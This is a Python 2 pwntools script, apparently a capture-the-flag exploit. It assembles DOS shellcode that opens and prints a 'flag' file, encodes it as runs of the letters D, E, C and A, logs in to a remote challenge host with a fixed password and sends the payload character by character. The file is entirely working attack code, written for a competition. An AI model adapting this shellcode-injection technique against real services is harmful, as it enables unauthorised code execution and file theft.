import pwn
import time
import sys

exploit_code = ""
exploit_code_len = 0

def asm8086(code):
    s = pwn.asm(code)
    if s[0] == "\x66":
        s = s[1:]
    elif len(s) > 1 and s[0] == "\x67\x66":
        s = s[2:]
    return s

def compileByte(b):
    global exploit_code
    global exploit_code_len
    exploit_code += b * "D"
    exploit_code += "E"
    exploit_code += b * "C"
    exploit_code += "A"
    exploit_code_len += 1

def compileString(a):
    for c in a:
        compileByte(ord(c))

def compileWord(n):
    compileString(p16(n))

def x(code):
    compileString(asm8086(code))


def genCode(offset=0):
    global exploit_code
    global exploit_code_len
    exploit_code = ""
    exploit_code_len = 0

    b = 0x19a

    x('mov ah, 0x3d') #open
    x('mov dx, ' + hex(b+offset))
    x('mov al, 0x0')
    x('int 0x21')
    x('xchg ax, bx')
    x('mov cx, 0x80')
    x('mov ah, 0x3f') #read
    x('int 0x21')
    x('mov ah, 0x9') #print
    x('int 0x21')
    x('mov ah, 0x1') #getchar
    x('int 0x21')
    x('mov ah, 0x0') #exit
    x('int 0x21')


print "\\\\\\\\ BUILDING EXPLOIT CODE \\\\\\\\"
genCode()
genCode(exploit_code_len)

compileString("flag\x00")

log = open("log.txt", "w")

print "\\\\\\\\ CONNECTING TO SERVICE \\\\\\\\"
serv = pwn.remote("pwn.sect.ctf.rocks", 4444)

def timedRead(timeout=3):
    while True:
        r = serv.recvn(1, timeout=timeout)
        if r == "":
            break
        sys.stdout.write(r)
        log.write(r)
        log.flush()

timedRead()
serv.send("\n")
serv.send("\n")
timedRead(5)

print "\n\\\\\\\\ SENDING PASSWORD \\\\\\\\"
serv.sendline("HACKTHEPLANET")
timedRead(5)

print "\n\\\\\\\\ SENDING EXPLOIT \\\\\\\\"
#serv.sendline(exploit_code)
for i in xrange(len(exploit_code)):
    serv.send(exploit_code[i])
    time.sleep(0.08)
    if i%200==0: print "\\\\\\\\ PROGRESS: "+str((i*100)/len(exploit_code))+"% \\\\\\\\"
serv.send("\n")

print "\n\\\\\\\\ WAIT \\\\\\\\"
try:
    while True:
        timedRead()
except EOFError:
    while True:
        time.sleep(10)
